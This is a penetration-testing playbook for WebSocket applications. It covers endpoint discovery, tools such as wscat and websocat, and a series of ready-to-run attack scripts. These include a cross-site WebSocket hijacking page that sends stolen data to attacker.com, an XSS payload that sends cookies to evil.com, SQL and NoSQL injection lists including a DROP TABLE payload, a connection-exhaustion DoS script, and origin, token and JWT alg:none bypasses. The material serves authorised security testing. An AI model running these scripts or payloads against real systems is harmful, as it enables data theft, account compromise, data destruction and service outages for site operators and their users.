# WebSockets Playbook

## Indicators

Signs this vulnerability may be present:
- URLs with `ws://` or `wss://` protocols in JavaScript files
- Presence of `WebSocket` or `io` (Socket.IO) objects in frontend code
- Endpoints like `/socket`, `/ws`, `/websocket`, `/subscriptions`, `/realtime`
- HTTP 101 Switching Protocols responses
- `Upgrade: websocket` and `Connection: Upgrade` headers in requests
- JavaScript files containing `new WebSocket(`, `socket.io`, `SockJS`, or `SignalR`
- Real-time features like chat, notifications, live updates, collaborative editing
- Server-Sent Events (SSE) endpoints that may also have WebSocket alternatives

## Tools

### wscat

```bash
# Install wscat
npm install -g wscat

# Connect to WebSocket endpoint
wscat -c ws://target.com/socket

# Connect with subprotocol
wscat -c ws://target.com/socket -s graphql-ws

# Connect with custom headers
wscat -c ws://target.com/socket \
  -H "Cookie: session=abc123" \
  -H "Authorization: Bearer token"

# Connect to secure WebSocket
wscat -c wss://target.com/socket

# Connect with origin header
wscat -c ws://target.com/socket -o http://evil.com

# Execute commands after connecting
# Type messages directly in terminal, press Enter to send
```

### websocat

```bash
# Install websocat
# Download from https://github.com/vi/websocat/releases

# Basic connection
websocat ws://target.com/socket

# With custom headers
websocat -H "Cookie: session=abc123" ws://target.com/socket

# With origin header for CSWSH testing
websocat -H "Origin: http://evil.com" ws://target.com/socket

# Binary mode
websocat -b ws://target.com/socket

# One-shot message
echo '{"type":"ping"}' | websocat ws://target.com/socket

# Keep connection alive
websocat -k ws://target.com/socket

# With subprotocol
websocat --protocol graphql-ws ws://target.com/socket

# Verbose mode for debugging
websocat -v ws://target.com/socket
```

### Burp Suite WebSocket Testing

```
1. Configure browser to proxy through Burp
2. Navigate to target application with WebSocket features
3. Burp automatically captures WebSocket traffic in "WebSockets history"
4. Right-click messages to send to Repeater
5. Modify and replay messages in WebSocket Repeater

Key Features:
- Intercept both client-to-server and server-to-client messages
- Modify messages in-flight
- Replay historical messages
- Test with different payloads via Intruder
```

### Python WebSocket Client

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

async def test_websocket():
    uri = "ws://target.com/socket"

    # Custom headers
    headers = {
        "Cookie": "session=abc123",
        "Origin": "http://evil.com"
    }

    async with websockets.connect(uri, extra_headers=headers) as ws:
        # Send message
        await ws.send(json.dumps({"type": "subscribe", "channel": "admin"}))

        # Receive response
        response = await ws.recv()
        print(f"Received: {response}")

        # Keep receiving
        async for message in ws:
            print(f"Message: {message}")

asyncio.run(test_websocket())
```

### OWASP ZAP WebSocket Testing

```
1. Configure browser to proxy through ZAP
2. Navigate to WebSocket-enabled pages
3. View WebSocket messages in "WebSockets" tab
4. Use "Resend" to modify and replay messages
5. Use Fuzzer for automated payload testing
6. Check for Cross-Site WebSocket Hijacking in Active Scan
```

## Techniques

### 1. WebSocket Endpoint Discovery

```bash
# Search JavaScript files for WebSocket URLs
grep -r "new WebSocket" /path/to/js/files/
grep -r "ws://" /path/to/js/files/
grep -r "wss://" /path/to/js/files/

# Common WebSocket endpoints to check
curl -I http://target.com/socket
curl -I http://target.com/ws
curl -I http://target.com/websocket
curl -I http://target.com/realtime
curl -I http://target.com/subscriptions
curl -I http://target.com/cable  # ActionCable (Rails)
curl -I http://target.com/hub    # SignalR
curl -I http://target.com/sockjs

# Check for Socket.IO
curl "http://target.com/socket.io/?EIO=4&transport=polling"

# Check upgrade headers
curl -v -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  http://target.com/ws
```

### 2. Cross-Site WebSocket Hijacking (CSWSH)

Test for missing Origin header validation.

```html
<!-- CSWSH PoC page (host on attacker site) -->
<!DOCTYPE html>
<html>
<head>
    <title>CSWSH Test</title>
</head>
<body>
    <h1>Cross-Site WebSocket Hijacking</h1>
    <div id="output"></div>

    <script>
        // Connect to victim's WebSocket endpoint from attacker origin
        var ws = new WebSocket('wss://target.com/socket');

        ws.onopen = function() {
            console.log('Connected!');
            document.getElementById('output').innerHTML += 'Connected!<br>';

            // Send message to extract data
            ws.send(JSON.stringify({
                type: 'get_user_data'
            }));
        };

        ws.onmessage = function(event) {
            console.log('Received:', event.data);
            document.getElementById('output').innerHTML += 'Data: ' + event.data + '<br>';

            // Exfiltrate to attacker server
            fetch('https://attacker.com/collect?data=' + encodeURIComponent(event.data));
        };

        ws.onerror = function(error) {
            console.log('Error:', error);
        };
    </script>
</body>
</html>
```

```bash
# Test CSWSH with websocat
websocat -H "Origin: http://evil.com" ws://target.com/socket

# If connection succeeds with different origin, CSWSH is possible

# Test with null origin
websocat -H "Origin: null" ws://target.com/socket

# Test without origin header
websocat ws://target.com/socket
```

### 3. WebSocket Message Tampering

```python
#!/usr/bin/env python3
# Message tampering and injection testing
import asyncio
import websockets
import json

async def tamper_messages():
    uri = "ws://target.com/socket"

    async with websockets.connect(uri) as ws:
        # Test IDOR - access other users' data
        await ws.send(json.dumps({
            "action": "get_messages",
            "user_id": 1  # Try different user IDs
        }))
        print(await ws.recv())

        # Test privilege escalation
        await ws.send(json.dumps({
            "action": "admin_action",
            "role": "admin"
        }))
        print(await ws.recv())

        # Test parameter manipulation
        await ws.send(json.dumps({
            "action": "transfer",
            "amount": -100,  # Negative amount
            "to": "attacker"
        }))
        print(await ws.recv())

        # Test type confusion
        await ws.send(json.dumps({
            "action": "update_profile",
            "admin": True,
            "role": {"$ne": "user"}
        }))
        print(await ws.recv())

asyncio.run(tamper_messages())
```

### 4. XSS Through WebSocket Messages

```javascript
// Test XSS payloads through WebSocket
const ws = new WebSocket('ws://target.com/chat');

ws.onopen = () => {
    // Basic XSS
    ws.send(JSON.stringify({
        type: 'message',
        content: '<script>alert(document.cookie)</script>'
    }));

    // Event handler XSS
    ws.send(JSON.stringify({
        type: 'message',
        content: '<img src=x onerror="alert(1)">'
    }));

    // SVG XSS
    ws.send(JSON.stringify({
        type: 'message',
        content: '<svg onload="alert(1)">'
    }));

    // In username field
    ws.send(JSON.stringify({
        type: 'join',
        username: '<script>fetch("https://evil.com/?c="+document.cookie)</script>'
    }));
};

// If messages are reflected to other users without sanitization,
// stored XSS is possible through WebSocket messages
```

### 5. SQL/NoSQL Injection via WebSocket

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

async def test_injection():
    uri = "ws://target.com/socket"

    async with websockets.connect(uri) as ws:
        # SQL injection payloads
        sqli_payloads = [
            {"action": "search", "query": "' OR '1'='1"},
            {"action": "search", "query": "'; DROP TABLE users;--"},
            {"action": "get_user", "id": "1 UNION SELECT password FROM users--"},
            {"action": "login", "user": "admin'--", "pass": "x"},
        ]

        for payload in sqli_payloads:
            await ws.send(json.dumps(payload))
            response = await ws.recv()
            print(f"Payload: {payload}")
            print(f"Response: {response}\n")

        # NoSQL injection payloads
        nosqli_payloads = [
            {"action": "find", "filter": {"$ne": None}},
            {"action": "find", "filter": {"$gt": ""}},
            {"action": "login", "user": {"$ne": ""}, "pass": {"$ne": ""}},
            {"action": "search", "query": {"$regex": ".*"}},
        ]

        for payload in nosqli_payloads:
            await ws.send(json.dumps(payload))
            response = await ws.recv()
            print(f"Payload: {payload}")
            print(f"Response: {response}\n")

asyncio.run(test_injection())
```

### 6. Authentication and Session Testing

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

async def test_auth():
    uri = "ws://target.com/socket"

    # Test without authentication
    async with websockets.connect(uri) as ws:
        await ws.send(json.dumps({"action": "get_admin_data"}))
        response = await ws.recv()
        print(f"No auth response: {response}")

    # Test with expired token
    headers = {"Cookie": "session=expired_token_here"}
    async with websockets.connect(uri, extra_headers=headers) as ws:
        await ws.send(json.dumps({"action": "get_admin_data"}))
        response = await ws.recv()
        print(f"Expired token response: {response}")

    # Test token fixation
    async with websockets.connect(uri) as ws:
        await ws.send(json.dumps({
            "action": "set_token",
            "token": "attacker_controlled_token"
        }))
        response = await ws.recv()
        print(f"Token fixation response: {response}")

    # Test if auth is checked per-message or just on connect
    headers = {"Cookie": "session=valid_token"}
    async with websockets.connect(uri, extra_headers=headers) as ws:
        # First valid request
        await ws.send(json.dumps({"action": "get_user_data"}))
        print(f"Valid: {await ws.recv()}")

        # Then try admin action without re-auth
        await ws.send(json.dumps({"action": "admin_command"}))
        print(f"Admin attempt: {await ws.recv()}")

asyncio.run(test_auth())
```

### 7. DoS via WebSocket

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

async def dos_test():
    uri = "ws://target.com/socket"

    # Connection exhaustion
    connections = []
    for i in range(1000):
        try:
            ws = await websockets.connect(uri)
            connections.append(ws)
            print(f"Connection {i} established")
        except Exception as e:
            print(f"Failed at connection {i}: {e}")
            break

    # Message flooding
    async with websockets.connect(uri) as ws:
        for i in range(10000):
            await ws.send("A" * 10000)  # Large messages

    # Slowloris-style (slow sending)
    async with websockets.connect(uri) as ws:
        large_message = "A" * 1000000
        # Send one byte at a time (if supported)
        for char in large_message:
            await ws.send(char)
            await asyncio.sleep(0.1)

asyncio.run(dos_test())
```

### 8. Handshake Vulnerabilities

```bash
# Test with manipulated handshake headers
curl -v -X GET "http://target.com/socket" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: $(echo -n 'test' | base64)" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Origin: http://evil.com"

# Test different WebSocket versions
for version in 8 13 14 15; do
  curl -v "http://target.com/socket" \
    -H "Upgrade: websocket" \
    -H "Connection: Upgrade" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Sec-WebSocket-Version: $version"
done

# Test with injection in Sec-WebSocket-Key
curl -v "http://target.com/socket" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: <script>alert(1)</script>" \
  -H "Sec-WebSocket-Version: 13"

# Test with injection in subprotocol
curl -v "http://target.com/socket" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Protocol: admin, <script>alert(1)</script>"
```

### 9. Socket.IO Specific Testing

```javascript
// Socket.IO client testing
const io = require('socket.io-client');

// Connect with different transports
const socket = io('http://target.com', {
    transports: ['websocket'],
    forceNew: true
});

socket.on('connect', () => {
    console.log('Connected:', socket.id);

    // Test event injection
    socket.emit('admin_event', {data: 'test'});

    // Test room enumeration
    socket.emit('join', 'admin_room');

    // Test broadcast abuse
    socket.emit('broadcast', {
        event: 'message',
        data: '<script>alert(1)</script>'
    });
});

socket.on('message', (data) => {
    console.log('Received:', data);
});

// Enumerate available events (if error messages reveal them)
['message', 'data', 'update', 'admin', 'debug', 'error'].forEach(event => {
    socket.emit(event, {test: true});
});
```

```bash
# Socket.IO polling endpoint testing
# Get session ID
curl "http://target.com/socket.io/?EIO=4&transport=polling"

# Send message via polling (use sid from previous response)
curl -X POST "http://target.com/socket.io/?EIO=4&transport=polling&sid=SESSION_ID" \
  -d '42["message","<script>alert(1)</script>"]'
```

## Bypass Techniques

### Origin Validation Bypass

```bash
# Null origin
websocat -H "Origin: null" ws://target.com/socket

# Case variations
websocat -H "Origin: HTTP://TARGET.COM" ws://target.com/socket

# Subdomain bypass (if *.target.com is allowed)
websocat -H "Origin: http://evil.target.com" ws://target.com/socket

# Port variation
websocat -H "Origin: http://target.com:8080" ws://target.com/socket

# Protocol variation
websocat -H "Origin: https://target.com" ws://target.com/socket

# Double origin
websocat -H "Origin: http://target.com" -H "Origin: http://evil.com" ws://target.com/socket

# Referer instead of Origin
websocat -H "Referer: http://target.com" ws://target.com/socket

# With additional headers
websocat -H "Origin: http://target.com.evil.com" ws://target.com/socket
websocat -H "Origin: http://targetXcom" ws://target.com/socket
```

### Token/Session Bypass

```python
#!/usr/bin/env python3
import asyncio
import websockets

async def bypass_auth():
    uri = "ws://target.com/socket"

    # Try without any auth
    async with websockets.connect(uri) as ws:
        await ws.send('{"action":"get_data"}')
        print(await ws.recv())

    # Try with manipulated token
    headers = {"Cookie": "session=admin"}
    async with websockets.connect(uri, extra_headers=headers) as ws:
        await ws.send('{"action":"get_data"}')
        print(await ws.recv())

    # Try JWT with alg:none
    headers = {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."}
    async with websockets.connect(uri, extra_headers=headers) as ws:
        await ws.send('{"action":"admin_action"}')
        print(await ws.recv())

asyncio.run(bypass_auth())
```

### Message Format Bypass

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

async def format_bypass():
    uri = "ws://target.com/socket"

    async with websockets.connect(uri) as ws:
        # Try different message formats
        messages = [
            '{"action":"admin"}',                    # Normal JSON
            "{'action':'admin'}",                    # Single quotes
            'action=admin',                          # URL encoded
            '<action>admin</action>',                # XML
            'action:admin',                          # YAML-like
            '["admin"]',                             # Array
            'null',                                  # Null
            '{"action":"admin","action":"user"}',    # Duplicate keys
            '{"action":"admin",}',                   # Trailing comma
            '{"__proto__":{"admin":true}}',          # Prototype pollution
        ]

        for msg in messages:
            try:
                await ws.send(msg)
                response = await asyncio.wait_for(ws.recv(), timeout=2)
                print(f"Sent: {msg[:50]}")
                print(f"Response: {response[:100]}\n")
            except Exception as e:
                print(f"Error with {msg[:30]}: {e}\n")

asyncio.run(format_bypass())
```

### Rate Limiting Bypass

```python
#!/usr/bin/env python3
import asyncio
import websockets

async def rate_limit_bypass():
    uri = "ws://target.com/socket"

    # Multiple connections from same client
    tasks = []
    for i in range(10):
        tasks.append(send_messages(uri, i))

    await asyncio.gather(*tasks)

async def send_messages(uri, conn_id):
    async with websockets.connect(uri) as ws:
        for i in range(100):
            await ws.send(f'{{"action":"request","id":{conn_id * 100 + i}}}')
            await asyncio.sleep(0.01)  # Small delay

asyncio.run(rate_limit_bypass())
```

## Success Indicators

- WebSocket connection established from unauthorized origin (CSWSH vulnerable)
- Sensitive data received without proper authentication
- XSS payloads reflected to other connected users
- SQL/NoSQL injection payloads return database data or errors
- IDOR allows accessing other users' data through user_id manipulation
- Privilege escalation via manipulated role/admin fields
- Server crashes or becomes unresponsive during DoS testing
- Session fixation or token manipulation accepted
- Messages processed without proper authorization per-message
- Error messages reveal internal implementation details
- Admin or debug events accessible to regular users
- Message tampering affects other users' sessions
- Authentication bypass via null or manipulated tokens
- Subscription to privileged channels without authorization
